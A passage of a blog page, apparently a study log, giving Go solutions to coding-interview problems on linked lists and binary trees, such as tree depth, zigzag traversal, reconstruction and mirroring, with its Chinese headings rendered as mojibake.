class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type ListNode struct&#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Next *ListNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param head ListNodeç±» </span></span><br><span class="line"><span class="comment"> * @param val intæ•´å‹ </span></span><br><span class="line"><span class="comment"> * @return ListNodeç±»</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deleteNode</span><span class="params">( head *ListNode ,  val <span class="keyword">int</span> )</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> head == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    pre := &amp;ListNode&#123;&#125;</span><br><span class="line">    tmp := pre</span><br><span class="line">    pre.Next = head</span><br><span class="line">    <span class="keyword">for</span> head != <span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> head.Val == val&#123;</span><br><span class="line">            pre.Next = head.Next</span><br><span class="line">        &#125;</span><br><span class="line">        pre = pre.Next</span><br><span class="line">        head = pre.Next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmp.Next</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ ‘"><a href="#æ ‘" class="headerlink" title="æ ‘"></a>æ ‘</h2><h3 id="äºŒå‰æ ‘çš„æ·±åº¦"><a href="#äºŒå‰æ ‘çš„æ·±åº¦" class="headerlink" title="äºŒå‰æ ‘çš„æ·±åº¦"></a><strong>äºŒå‰æ ‘çš„æ·±åº¦</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pRoot TreeNodeç±» </span></span><br><span class="line"><span class="comment"> * @return intæ•´å‹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TreeDepth</span><span class="params">( pRoot *TreeNode )</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> pRoot == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    left := TreeDepth(pRoot.Left)</span><br><span class="line">    right := TreeDepth(pRoot.Right)</span><br><span class="line">    max := <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> left&gt;right&#123;</span><br><span class="line">        max = left+<span class="number">1</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        max = right+<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æŒ‰ä¹‹å­—å½¢é¡ºåºæ‰“å°äºŒå‰æ ‘"><a href="#æŒ‰ä¹‹å­—å½¢é¡ºåºæ‰“å°äºŒå‰æ ‘" class="headerlink" title="æŒ‰ä¹‹å­—å½¢é¡ºåºæ‰“å°äºŒå‰æ ‘"></a><strong>æŒ‰ä¹‹å­—å½¢é¡ºåºæ‰“å°äºŒå‰æ ‘</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pRoot TreeNodeç±» </span></span><br><span class="line"><span class="comment"> * @return intæ•´å‹äºŒç»´æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Print</span><span class="params">( pRoot *TreeNode )</span> [][]<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> pRoot == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    ans := [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    lis := []*TreeNode&#123;&#125;</span><br><span class="line">    ll := <span class="built_in">len</span>(lis)</span><br><span class="line">    tl := []*TreeNode&#123;&#125;</span><br><span class="line">    tans := []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    lis = <span class="built_in">append</span>(lis,pRoot)</span><br><span class="line">    flag := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">len</span>(lis) != <span class="number">0</span>&#123;</span><br><span class="line">        ll = <span class="built_in">len</span>(lis)</span><br><span class="line">        tl = []*TreeNode&#123;&#125;</span><br><span class="line">        tans = []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;ll;i++&#123;</span><br><span class="line">            tmp := lis[i]</span><br><span class="line">            tans = <span class="built_in">append</span>(tans,tmp.Val)</span><br><span class="line">            <span class="keyword">if</span> tmp.Left != <span class="literal">nil</span>&#123;</span><br><span class="line">                tl = <span class="built_in">append</span>(tl,tmp.Left)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> tmp.Right != <span class="literal">nil</span>&#123;</span><br><span class="line">                tl = <span class="built_in">append</span>(tl,tmp.Right)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> flag ==<span class="number">0</span>&#123;</span><br><span class="line">        </span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            re(tans)</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        lis = tl</span><br><span class="line">        ans = <span class="built_in">append</span>(ans,tans)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">re</span><span class="params">(ll []<span class="keyword">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> i,l,tmp:=<span class="number">0</span>,<span class="built_in">len</span>(ll)<span class="number">-1</span>,<span class="number">0</span>;i&lt;l;i,l = i+<span class="number">1</span>,l<span class="number">-1</span>&#123;</span><br><span class="line">        tmp = ll[l] </span><br><span class="line">        ll[l] = ll[i] </span><br><span class="line">        ll[i] = tmp</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äºŒå‰æœç´¢æ ‘çš„ç¬¬kä¸ªèŠ‚ç‚¹"><a href="#äºŒå‰æœç´¢æ ‘çš„ç¬¬kä¸ªèŠ‚ç‚¹" class="headerlink" title="äºŒå‰æœç´¢æ ‘çš„ç¬¬kä¸ªèŠ‚ç‚¹"></a><strong>äºŒå‰æœç´¢æ ‘çš„ç¬¬kä¸ªèŠ‚ç‚¹</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param proot TreeNodeç±» </span></span><br><span class="line"><span class="comment"> * @param k intæ•´å‹ </span></span><br><span class="line"><span class="comment"> * @return intæ•´å‹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> cnt,res <span class="keyword">int</span> = <span class="number">0</span>,<span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">KthNode</span><span class="params">( proot *TreeNode ,  k <span class="keyword">int</span> )</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> proot == <span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    &#125;</span><br><span class="line">    cnt = k</span><br><span class="line">    find(proot)</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">find</span><span class="params">( proot *TreeNode)</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> proot == <span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    find(proot.Left)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> cnt==<span class="number">1</span>&#123;</span><br><span class="line">        res = proot.Val</span><br><span class="line">    &#125;</span><br><span class="line">    cnt--</span><br><span class="line">    find(proot.Right)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é‡å»ºäºŒå‰æ ‘"><a href="#é‡å»ºäºŒå‰æ ‘" class="headerlink" title="é‡å»ºäºŒå‰æ ‘"></a><strong>é‡å»ºäºŒå‰æ ‘</strong></h3><p>é€’å½’</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pre intæ•´å‹ä¸€ç»´æ•°ç»„ </span></span><br><span class="line"><span class="comment"> * @param vin intæ•´å‹ä¸€ç»´æ•°ç»„ </span></span><br><span class="line"><span class="comment"> * @return TreeNodeç±»</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reConstructBinaryTree</span><span class="params">( pre []<span class="keyword">int</span> ,  vin []<span class="keyword">int</span> )</span> *<span class="title">TreeNode</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pre) == <span class="number">0</span> || <span class="built_in">len</span>(vin) == <span class="number">0</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    root := &amp;TreeNode&#123;Val: pre[<span class="number">0</span>]&#125;</span><br><span class="line">    idx := findIndex(vin, pre[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> idx &gt; <span class="number">0</span> &#123;</span><br><span class="line">        root.Left = reConstructBinaryTree(pre[<span class="number">1</span>:idx+<span class="number">1</span>], vin[<span class="number">0</span>:idx])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> idx+<span class="number">1</span> &lt; <span class="built_in">len</span>(vin) &#123;</span><br><span class="line">       root.Right = reConstructBinaryTree(pre[idx+<span class="number">1</span>:], vin[idx+<span class="number">1</span>:])</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findIndex</span><span class="params">(a []<span class="keyword">int</span>, val <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i, v :=  <span class="keyword">range</span> a &#123;</span><br><span class="line">        <span class="keyword">if</span> v == val&#123;</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ ‘çš„å­ç»“æ„"><a href="#æ ‘çš„å­ç»“æ„" class="headerlink" title="æ ‘çš„å­ç»“æ„"></a><strong>æ ‘çš„å­ç»“æ„</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pRoot1 TreeNodeç±» </span></span><br><span class="line"><span class="comment"> * @param pRoot2 TreeNodeç±» </span></span><br><span class="line"><span class="comment"> * @return boolå¸ƒå°”å‹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HasSubtree</span><span class="params">( pRoot1 *TreeNode ,  pRoot2 *TreeNode )</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> pRoot1 == <span class="literal">nil</span> || pRoot2 == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    res := <span class="literal">false</span></span><br><span class="line">    <span class="keyword">if</span> pRoot1.Val == pRoot2.Val &#123;</span><br><span class="line">        res = isSubtree(pRoot1, pRoot2)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> !res &#123;</span><br><span class="line">        res = HasSubtree(pRoot1.Left, pRoot2)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> !res &#123;</span><br><span class="line">        res = HasSubtree(pRoot1.Right, pRoot2)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isSubtree</span><span class="params">(pRoot1, pRoot2 *TreeNode)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> pRoot2 == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> pRoot1 == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> pRoot1.Val == pRoot2.Val &amp;&amp; </span><br><span class="line">    isSubtree(pRoot1.Left, pRoot2.Left) &amp;&amp; </span><br><span class="line">    isSubtree(pRoot1.Right, pRoot2.Right)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äºŒå‰æ ‘çš„é•œåƒ"><a href="#äºŒå‰æ ‘çš„é•œåƒ" class="headerlink" title="äºŒå‰æ ‘çš„é•œåƒ"></a><strong>äºŒå‰æ ‘çš„é•œåƒ</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pRoot TreeNodeç±» </span></span><br><span class="line"><span class="comment"> * @return TreeNodeç±»</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Mirror</span><span class="params">( pRoot *TreeNode )</span> *<span class="title">TreeNode</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> pRoot == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    l := Mirror(pRoot.Left)</span><br><span class="line">    r := Mirror(pRoot.Right)</span><br><span class="line">    pRoot.Left = r </span><br><span class="line">    pRoot.Right = l</span><br><span class="line">    <span class="keyword">return</span> pRoot</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä»ä¸Šå¾€ä¸‹æ‰“å°äºŒå‰æ ‘"><a href="#ä»ä¸Šå¾€ä¸‹æ‰“å°äºŒå‰æ ‘" class="headerlink" title="ä»ä¸Šå¾€ä¸‹æ‰“å°äºŒå‰æ ‘"></a>ä»ä¸Šå¾€ä¸‹æ‰“å°äºŒå‰æ ‘</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä»£ç ä¸­çš„ç±»åã€æ–¹æ³•åã€å‚æ•°åå·²ç»æŒ‡å®šï¼Œè¯·å‹¿ä¿®æ”¹ï¼Œç›´æ¥è¿”å›æ–¹æ³•è§„å®šçš„å€¼å³å¯</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param root TreeNodeç±» </span></span><br><span class="line"><span class="comment"> * @return intæ•´å‹ä¸€ç»´æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PrintFromTopToBottom</span><span class="params">( root *TreeNode )</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span 